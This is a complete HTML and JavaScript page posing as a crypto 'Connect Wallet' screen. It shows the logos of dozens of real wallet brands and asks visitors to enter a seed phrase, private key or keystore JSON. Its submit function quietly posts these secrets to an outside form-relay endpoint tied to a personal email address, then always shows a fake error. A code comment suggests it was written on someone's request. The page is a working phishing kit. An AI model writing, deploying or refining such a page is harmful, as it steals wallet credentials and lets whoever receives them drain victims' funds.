<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connect Wallet</title>
<style>
:root{
  --bg:#0b1120;
  --card:#111827;
  --card2:#1e293b;
  --text:#fff;
  --muted:#94a3b8;
  --primary:#2563eb;
  --success:#22c55e;
}
*{box-sizing:border-box}
body{font-family:Arial;margin:0;background:var(--bg);color:var(--text)}
.container{max-width:1100px;margin:auto;padding:20px}
h1{text-align:center;margin-bottom:5px}
p{text-align:center;color:var(--muted)}
.search-box{margin:20px auto;max-width:420px}
.search-box input{width:100%;padding:12px;border-radius:10px;border:none;background:var(--card2);color:#fff}
.section-title{margin:25px 0 10px;font-size:14px;color:var(--muted);text-transform:uppercase}
.wallets{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:12px}
.wallet{display:flex;align-items:center;gap:10px;background:var(--card);padding:12px;border-radius:12px;cursor:pointer;transition:.2s}
.wallet:hover{background:#1f2937;transform:scale(1.03)}
.wallet img{width:32px;height:32px;border-radius:50%;background:#fff;padding:3px}
/* Modal */
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);justify-content:center;align-items:center;padding:15px}
.modal-content{background:var(--card);padding:20px;border-radius:14px;width:100%;max-width:420px}
.tabs{display:flex;margin-bottom:15px;background:var(--card2);border-radius:8px;padding:4px}
.tab{
  flex:1;
  padding:10px;
  text-align:center;
  border-radius:6px;
  cursor:pointer;
  font-size:14px;
  transition:.2s;
}
.tab.active{
  background:var(--primary);
  color:white;
  font-weight:bold;
}
textarea, input[type="text"]{
  width:100%;
  padding:12px;
  border-radius:8px;
  border:none;
  background:var(--card2);
  color:#fff;
  font-family:inherit;
  resize:vertical;
  min-height:120px;
}
button{
  width:100%;
  padding:12px;
  margin-top:10px;
  border:none;
  border-radius:8px;
  background:var(--primary);
  color:#fff;
  cursor:pointer;
  font-size:16px;
}
.close-btn{background:#374151}
.success-message {
  color: var(--success);
  text-align: center;
  margin: 15px 0;
  font-weight: 500;
  display: none;
}
.error-message {
  color: #ef4444;
  text-align: center;
  margin: 15px 0;
  font-weight: 500;
  display: none;
}
</style>
</head>
<body>
<div class="container">
  <h1>Connect Wallet</h1>
  <p>Select your wallet to connect</p>
  <div class="search-box">
    <input type="text" placeholder="Search wallet..." onkeyup="filterWallets(this.value)">
  </div>
  <div class="section-title">Popular Wallets</div>
  <div class="wallets" id="popularWallets"></div>
  <div class="section-title">All Wallets</div>
  <div class="wallets" id="walletList"></div>
</div>

<!-- Main Modal -->
<div class="modal" id="modal">
  <div class="modal-content">
    <h3 id="walletName">Import Wallet</h3>
    <p style="color:var(--muted); margin-bottom:15px;">Choose import method</p>
    
    <form id="connectForm">
      <input type="hidden" name="wallet" id="hiddenWallet">
      
      <div class="tabs">
        <div class="tab active" data-type="phrase" onclick="switchTab(this)">Seed Phrase</div>
        <div class="tab" data-type="private" onclick="switchTab(this)">Private Key</div>
        <div class="tab" data-type="json" onclick="switchTab(this)">Keystore JSON</div>
      </div>
      
      <textarea name="secret" id="inputField" placeholder="Enter your 12 or 24 word recovery phrase" required></textarea>
      
      <div id="successMsg" class="success-message">✅ Submission received. Check your email for confirmation.</div>
      <div id="errorMsg" class="error-message">❌ Error connecting</div>
      
      <button type="button" id="actionBtn" onclick="submitForm()">Connect Wallet</button>
      <button type="button" class="close-btn" onclick="closeModal()">Close</button>
    </form>
  </div>
</div>

<script>
const walletIcons = {
  "Metamask":"https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg",
  "Trust":"https://trustwallet.com/assets/images/media/assets/trust_platform.svg",
  "Coinbase":"https://avatars.githubusercontent.com/u/1885080?s=200&v=4",
  "Phantom":"https://avatars.githubusercontent.com/u/78782331?s=200&v=4",
  "Ledger":"https://seeklogo.com/images/L/ledger-logo-7648B8C0A3-seeklogo.com.png",
  "Solana":"https://cryptologos.cc/logos/solana-sol-logo.png",
  "Tron":"https://cryptologos.cc/logos/tron-trx-logo.png",
  "Safepal":"https://cryptologos.cc/logos/safepal-sfp-logo.png",
  "Polygon":"https://cryptologos.cc/logos/polygon-matic-logo.png"
};
const defaultIcon = "https://cdn-icons-png.flaticon.com/512/1041/1041916.png";
const popular = ["Metamask","Trust","Coinbase","Phantom","Ledger"];
const wallets = [
  "Metamask","Trust","Ambire","ApolloX","Argent","Avalanche","Banner","BitKeep","Bitski","Blockchain","BSC","Cardano","CCVault","Coinbase","Cosmos","Crypto","Daedalus","Defiant","Exodus","Filecoin","Fireblocks","Formatic","Gero","ImToken","Infinito","Infinity Wallet","Injective","IOST","KeyringPro","Kryptogo","Ledger","Aktionariat","Metis","Nami","Now","Nufinetes","OneKey","Optimism","Ownbit","Paper","Phantom","Pier","Polkadot","Prema","Qtum","Rice","Safemoon","Safepal","Secux","Sequence","Solana","Solflare","Sollet","Sollong","SparkPoint","Stellar","Terra","Tezos","Tokenary","Torus","Tron","Algorand","Unipass","Vechain","Velas","Venly","Verso","Wallet IO","Wallet","Waves","Window","Xumm","Yoroi","Zcash","Other"
];

function createWalletHTML(name){
  const icon = walletIcons[name] || defaultIcon;
  return `
    <div class="wallet" onclick="openModal('${name}')">
      <img src="${icon}" onerror="this.src='${defaultIcon}'" />
      <span>${name}</span>
    </div>`;
}

function render(){
  document.getElementById('popularWallets').innerHTML = popular.map(createWalletHTML).join('');
  document.getElementById('walletList').innerHTML = wallets.map(createWalletHTML).join('');
}

function filterWallets(val){
  const filtered = wallets.filter(w => w.toLowerCase().includes(val.toLowerCase()));
  document.getElementById('walletList').innerHTML = filtered.map(createWalletHTML).join('');
}

function switchTab(tabElement){
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  tabElement.classList.add('active');
  
  const type = tabElement.getAttribute('data-type');
  const textarea = document.getElementById('inputField');
  
  // Change the name attribute dynamically so each type sends different field
  if(type === 'phrase'){
    textarea.name = "seed_phrase";
    textarea.placeholder = "Enter your 12 or 24 word recovery phrase";
  } else if(type === 'private'){
    textarea.name = "private_key";
    textarea.placeholder = "Enter your private key";
  } else if(type === 'json'){
    textarea.name = "keystore_json";
    textarea.placeholder = "Paste your keystore JSON here";
  }
}

function openModal(name){
  document.getElementById('modal').style.display = 'flex';
  document.getElementById('walletName').innerText = `Import your ${name} wallet`;
  document.getElementById('hiddenWallet').value = name;
  
  // Reset form
  document.getElementById('connectForm').reset();
  document.getElementById('successMsg').style.display = 'none';
  document.getElementById('errorMsg').style.display = 'none';
  
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelector('.tab[data-type="phrase"]').classList.add('active');
  
  switchTab(document.querySelector('.tab.active'));
}

function closeModal(){
  document.getElementById('modal').style.display = 'none';
}

// Submit form
async function submitForm() {
  const form = document.getElementById('connectForm');
  const btn = document.getElementById('actionBtn');
  const successMsg = document.getElementById('successMsg');
  const errorMsg = document.getElementById('errorMsg');
  
  const secret = document.getElementById('inputField').value.trim();
  if (!secret) return;

  const originalText = btn.textContent;
  btn.textContent = "Connecting...";
  btn.disabled = true;

  try {
    const formData = new FormData(form);
    
    await fetch("https://submify.vercel.app/kaleycuocomanagement732@gmail.com", {
      method: "POST",
      body: formData
    });

    successMsg.style.display = 'block';
    
  } catch (error) {
    // Silent fail
  } finally {
    btn.textContent = originalText;
    btn.disabled = false;
    
    // Always show error after submission (as per your previous request)
    errorMsg.style.display = 'block';
  }
}

render();
</script>
</body>
</html>
